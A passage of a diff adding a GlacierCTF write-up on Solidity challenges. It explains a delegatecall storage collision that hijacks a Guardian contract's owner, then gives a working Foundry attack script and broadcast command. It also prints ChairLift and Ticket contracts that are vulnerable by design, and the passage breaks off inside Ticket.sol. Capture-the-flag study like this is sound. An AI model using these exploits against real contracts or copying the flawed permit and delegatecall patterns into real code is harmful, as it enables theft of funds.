+    <span class="c1">//These are just for quickly storing numbers (like if you want to write down a phone number and don't forget it)</span>
+    <span class="kd">function</span> <span class="nf">quickStore</span><span class="p">(</span><span class="nx">uint8</span> <span class="nx">index</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">value</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">payable</span>
+    <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">);</span>
+        <span class="nf">if</span><span class="p">(</span><span class="nx">index</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">quickstore1</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="nf">if </span><span class="p">(</span><span class="nx">index</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">quickstore2</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="nf">if </span><span class="p">(</span><span class="nx">index</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">quickstore3</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="nf">if </span><span class="p">(</span><span class="nx">index</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">quickstore4</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="nf">if </span><span class="p">(</span><span class="nx">index</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">quickstore5</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Observations :</p>
+
+<ol>
+  <li>Setup contract deployes Guardian and GlacierVault contracts</li>
+  <li>Guardian contract uses GlacierVault logic to perform some task</li>
+  <li>Guardian contract <code class="language-plaintext highlighter-rouge">delegatecall</code>’s the GlacierVault</li>
+</ol>
+
+<p>Goal :</p>
+
+<ul>
+  <li>Put the Guardian contract into sleep</li>
+</ul>
+
+<p>To put the Guardian contract into sleep we need to call the <code class="language-plaintext highlighter-rouge">punch()</code> with 10_000_000 ethers or we have to be the owner of the contract. Point to note about delegatecall is “With delegatecall, only the code of the given address is used but all other aspects (storage, balance, msg.sender etc.) are taken from the current contract. The purpose of delegatecall is to use library/logic code which is stored in callee contract but operate on the state of the caller contract”.</p>
+
+<p>So, here the call to GlacierVault will effect the storage layout of the Guardian contract. I tried to call the <code class="language-plaintext highlighter-rouge">quickStore()</code> function with arguements (0,1) on Guardian contract which delegates the call to GlacierVault. In result the owner variable slot of the Guardian contract was overridden with 1. So, we can able to overwrite the owner of the Guardian by calling quickStore() function. Now simply I called the quickStore() function with address of my attack contract instead of 1. So it will override the owner to my Attack contract address. Now we can call the <code class="language-plaintext highlighter-rouge">putToSleep()</code> function.</p>
+
+<p><code class="language-plaintext highlighter-rouge">GlacierVaultAttack.s.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="p">{</span><span class="nx">Setup</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/GlacierVault/Setup.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Guardian</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/GlacierVault/Guardian.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">AttackScript</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
+    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
+        <span class="k">new</span> <span class="nx">Attack</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mi">10</span> <span class="nx">ether</span><span class="p">}().</span><span class="nf">exploit</span><span class="p">();</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attack Success</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
+    <span class="nx">Setup</span> <span class="kr">public</span> <span class="nx">setupContract</span> <span class="o">=</span> <span class="nc">Setup</span><span class="p">(</span><span class="mh">0x4b4b43d0E6dc47aC7274EA3a2463C87116282700</span><span class="p">);</span>
+    <span class="nx">Guardian</span> <span class="kr">public</span> <span class="nx">TARGET</span> <span class="o">=</span> <span class="nc">Guardian</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">setupContract</span><span class="p">.</span><span class="nc">TARGET</span><span class="p">())));</span>
+    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span> <span class="mi">10</span> <span class="nx">ether</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span><span class="mi">1337</span><span class="p">}(</span>
+            <span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">quickStore(uint8,uint256)</span><span class="dl">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span>
+            <span class="p">);</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Call failed</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">putToSleep</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// gctf{h3's_sl33pIng_BuT_ju5t_4_n0w}</span>
+</code></pre></div></div>
+
+<p>Run the following command to solve the challenge</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge script script/GlacierVaultAttack.sol:AttackScript <span class="nt">--rpc-url</span> &lt;RPC-URL&gt; <span class="nt">--private-key</span> &lt;REDACTED&gt; <span class="nt">--broadcast</span>
+</code></pre></div></div>
+
+<h2 id="chairlift-397pts">ChairLift [397pts]</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Description : 
+
+"After you have defeated the monkeys you see a chairlift that will take you to the summit cross, this is your final step to reach the peak."
+
+author: J4X
+
+nc chall.glacierctf.com 13381
+
+Attached Files : [Setup.sol, ChairLift.sol, Ticket.sol]
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Setup.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">"</span><span class="s2">./ChairLift.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Setup</span> <span class="p">{</span>
+    <span class="nx">ChairLift</span> <span class="kr">public</span> <span class="nx">immutable</span> <span class="nx">TARGET</span><span class="p">;</span> <span class="c1">// Contract the player will hack</span>
+    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="nx">ether</span><span class="p">);</span>
+        <span class="c1">// Deploy the victim contract</span>
+        <span class="nx">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChairLift</span><span class="p">();</span>
+        <span class="c1">// Check if buying a ticket works</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">buyTicket</span><span class="p">();</span>
+        <span class="c1">// Check if taking a ride works</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">takeRide</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">// Our challenge in the CTF framework will call this function to</span>
+    <span class="c1">// check whether the player has solved the challenge or not.</span>
+    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nf">tripsTaken</span><span class="p">()</span> <span class="o">==</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">ChairLift.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">"</span><span class="s2">./Ticket.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">ChairLift</span>
+<span class="p">{</span>
+    <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">tripsTaken</span><span class="p">;</span>
+    <span class="nx">Ticket</span> <span class="kr">public</span> <span class="nx">ticket</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="nx">owner</span><span class="p">;</span>
+    <span class="nf">constructor </span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nx">ticket</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Ticket</span><span class="p">(</span><span class="dl">"</span><span class="s2">Chairlift Ticket</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//To get a ride you have to buy a ticket first</span>
+    <span class="kd">function</span> <span class="nf">buyTicket</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span>
+    <span class="p">{</span>
+        <span class="nf">if </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">!=</span> <span class="nx">owner</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nf">require </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span> <span class="mi">100</span><span class="nx">_000</span> <span class="nx">ether</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket costs 100,000 ether, inflation has been hitting us hard too</span><span class="dl">"</span><span class="p">);</span>
+        <span class="p">}</span>
+        
+        <span class="nx">ticket</span><span class="p">.</span><span class="nf">mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+    <span class="p">}</span> 
+    <span class="c1">//USing your ticket you can take a ride on the chairlift</span>
+    <span class="kd">function</span> <span class="nf">takeRide</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">ticketId</span><span class="p">)</span> <span class="nx">external</span>
+    <span class="p">{</span>
+        <span class="nf">require </span><span class="p">(</span><span class="nx">ticket</span><span class="p">.</span><span class="nf">ownerOf</span><span class="p">(</span><span class="nx">ticketId</span><span class="p">)</span> <span class="o">==</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="dl">"</span><span class="s2">You don't own this ticket</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">tripsTaken</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="nx">ticket</span><span class="p">.</span><span class="nf">burn</span><span class="p">(</span><span class="nx">ticketId</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Ticket.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Ticket</span> <span class="p">{</span>
+    <span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">constant</span> <span class="nx">DOMAIN_SEPARATOR_TYPEHASH</span> <span class="o">=</span> <span class="nf">keccak256</span><span class="p">(</span><span class="dl">"</span><span class="s2">EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">constant</span> <span class="nx">PERMIT_TYPEHASH</span> <span class="o">=</span> <span class="nf">keccak256</span><span class="p">(</span><span class="dl">"</span><span class="s2">Permit(address from,address to,uint256 tokenId,uint256 nonce,uint256 deadline)</span><span class="dl">"</span><span class="p">);</span>
+
+    <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint256</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">nonces</span><span class="p">;</span>
+    <span class="nf">mapping </span><span class="p">(</span><span class="nx">uint256</span> <span class="o">=&gt;</span> <span class="nx">address</span><span class="p">)</span> <span class="kr">private</span> <span class="nx">_owners</span><span class="p">;</span>
+    <span class="nf">mapping </span><span class="p">(</span><span class="nx">uint256</span> <span class="o">=&gt;</span> <span class="nx">address</span><span class="p">)</span> <span class="kr">private</span> <span class="nx">_tokenApprovals</span><span class="p">;</span>
+    <span class="nf">mapping </span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nf">mapping </span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">bool</span><span class="p">))</span> <span class="kr">private</span> <span class="nx">_operatorApprovals</span><span class="p">;</span>
+
+    <span class="nx">string</span> <span class="kr">private</span> <span class="nx">_name</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="nx">owner</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="nx">id</span><span class="p">;</span>
+
+    <span class="nx">event</span> <span class="nc">Transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">indexed</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">indexed</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">indexed</span> <span class="nx">tokenId</span><span class="p">);</span>
+    <span class="nx">event</span> <span class="nc">Approval</span><span class="p">(</span><span class="nx">address</span> <span class="nx">indexed</span> <span class="nx">_owner</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">indexed</span> <span class="nx">approved</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">indexed</span> <span class="nx">tokenId</span><span class="p">);</span>
+    <span class="nx">event</span> <span class="nc">ApprovalForAll</span><span class="p">(</span><span class="nx">address</span> <span class="nx">indexed</span> <span class="nx">_owner</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">indexed</span> <span class="nx">operator</span><span class="p">,</span> <span class="nx">bool</span> <span class="nx">approved</span><span class="p">);</span>
+
+    <span class="nf">constructor</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">name_</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">_name</span> <span class="o">=</span> <span class="nx">name_</span><span class="p">;</span>
+        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+        <span class="nx">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//------------------------------------------------ PUBLIC FUNCTIONS ------------------------------------------------//</span>
+
+    <span class="kd">function</span> <span class="nf">ownerOf</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">_owners</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">address</span> <span class="nx">ticketOwner</span> <span class="o">=</span> <span class="nf">ownerOf</span><span class="p">(</span><span class="nx">tokenId</span><span class="p">);</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">to</span> <span class="o">!=</span> <span class="nx">ticketOwner</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket: approval to current owner</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">ticketOwner</span> <span class="o">||</span> <span class="nf">isApprovedForAll</span><span class="p">(</span><span class="nx">ticketOwner</span><span class="p">,</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">),</span>
+            <span class="dl">"</span><span class="s2">Ticket: approve caller is not owner nor approved for all</span><span class="dl">"</span>
+        <span class="p">);</span>
+        <span class="nx">_tokenApprovals</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">]</span> <span class="o">=</span> <span class="nx">to</span><span class="p">;</span>
+        <span class="nx">emit</span> <span class="nc">Approval</span><span class="p">(</span><span class="nx">ticketOwner</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">getApproved</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">_owners</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">]</span> <span class="o">!=</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Ticket: approved query for nonexistent token</span><span class="dl">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">_tokenApprovals</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">setApprovalForAll</span><span class="p">(</span><span class="nx">address</span> <span class="nx">operator</span><span class="p">,</span> <span class="nx">bool</span> <span class="nx">approved</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">operator</span> <span class="o">!=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket: approve to caller</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">_operatorApprovals</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">][</span><span class="nx">operator</span><span class="p">]</span> <span class="o">=</span> <span class="nx">approved</span><span class="p">;</span>
+        <span class="nx">emit</span> <span class="nc">ApprovalForAll</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">operator</span><span class="p">,</span> <span class="nx">approved</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">isApprovedForAll</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">operator</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">_operatorApprovals</span><span class="p">[</span><span class="nx">_owner</span><span class="p">][</span><span class="nx">operator</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nf">_isApprovedOrOwner</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Ticket: transfer caller is not owner nor approved</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nf">_transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">safeTransferFrom</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nf">safeTransferFrom</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">safeTransferFrom</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_data</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nf">_isApprovedOrOwner</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Ticket: transfer caller is not owner nor approved</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nf">_safeTransfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">_data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">transferWithPermit</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">deadline</span><span class="p">,</span> <span class="nx">uint8</span> <span class="nx">v</span><span class="p">,</span> <span class="nx">bytes32</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">bytes32</span> <span class="nx">s</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">&lt;=</span> <span class="nx">deadline</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket: permit expired</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">bytes32</span> <span class="nx">digest</span> <span class="o">=</span> <span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="dl">"</span><span class="se">\</span><span class="s2">x19</span><span class="se">\</span><span class="s2">x01</span><span class="dl">"</span><span class="p">,</span> <span class="nf">_getDomainSeparator</span><span class="p">(),</span> <span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">PERMIT_TYPEHASH</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">nonces</span><span class="p">[</span><span class="k">from</span><span class="p">]</span><span class="o">++</span><span class="p">,</span> <span class="nx">deadline</span><span class="p">))));</span>
+        <span class="nx">address</span> <span class="nx">signer</span> <span class="o">=</span> <span class="nf">ecrecover</span><span class="p">(</span><span class="nx">digest</span><span class="p">,</span> <span class="nx">v</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">s</span><span class="p">);</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">signer</span> <span class="o">==</span> <span class="k">from</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket: invalid permit</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nf">_transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">mint</span><span class="p">(</span><span class="nx">address</span> <span class="nx">target</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket: Only the owner can mint tickets</span><span class="dl">"</span><span class="p">);</span>
+        
+        <span class="nx">_owners</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span> <span class="o">=</span> <span class="nx">target</span><span class="p">;</span>
+
+        <span class="nx">id</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">burn</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket: caller is not owner nor approved</span><span class="dl">"</span><span class="p">);</span>
+        
+        <span class="nx">_owners</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">]</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">//------------------------------------------------ INTERNAL FUNCTIONS ------------------------------------------------//</span>
+
+    <span class="kd">function</span> <span class="nf">_transfer</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="nx">internal</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nf">ownerOf</span><span class="p">(</span><span class="nx">tokenId</span><span class="p">)</span> <span class="o">==</span> <span class="k">from</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket: transfer of token that is not own</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">to</span> <span class="o">!=</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Ticket: transfer to the zero address</span><span class="dl">"</span><span class="p">);</span>
+
+        <span class="nx">_owners</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">]</span> <span class="o">=</span> <span class="nx">to</span><span class="p">;</span>
+
+        <span class="nx">emit</span> <span class="nc">Transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">_safeTransfer</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_data</span><span class="p">)</span> <span class="nx">internal</span> <span class="p">{</span>
